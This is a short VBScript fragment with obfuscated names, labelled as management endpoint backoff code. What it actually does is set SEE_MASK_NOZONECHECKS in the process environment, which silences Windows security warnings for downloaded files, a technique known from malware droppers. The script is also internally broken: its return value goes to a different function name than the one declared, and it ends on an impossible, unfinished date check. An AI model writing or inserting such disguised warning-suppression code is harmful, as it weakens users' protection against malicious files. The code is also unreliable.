' --- Management endpoint backoff ---
Function ExtractSyncToken13()
On Error Resume Next
  Dim strKey53,strPath41,blnValid77
  Set strKey53=CreateObject("WScript.Shell")
  strPath41=strKey53.ExpandEnvironmentStrings("%TEMP%")
  blnValid77=strKey53.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strPath41)>0 And Len(blnValid77)>0 Then
    strKey53.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ReadBackupCipher92=1
    Exit Function
  End If
  ReadBackupCipher92=0
End Function

If Day(Now) > 31 Then
